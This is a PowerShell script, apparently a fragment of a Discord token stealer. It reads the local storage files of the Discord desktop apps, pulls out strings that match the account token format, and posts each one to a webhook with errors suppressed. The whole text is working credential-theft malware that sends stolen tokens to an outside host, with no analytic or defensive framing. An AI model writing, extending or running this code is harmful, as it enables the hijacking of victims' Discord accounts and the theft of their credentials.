# Function to send to Discord
function Send-Discord {
    param($content)
    $payload = @{ content = $content } | ConvertTo-Json -Depth 10
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
    } catch {}
}

# 1. Grab Discord desktop app tokens
$discordPaths = @(
    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
    "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
    "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb"
)
$foundTokens = @()
foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
            foreach ($match in $matches) {
                if ($match.Value -notin $foundTokens) {
                    $foundTokens += $match.Value
                    Send-Discord "**[DISCORD APP TOKEN]**`n```$($match.Value)```"
                }
            }
        }
    }
}

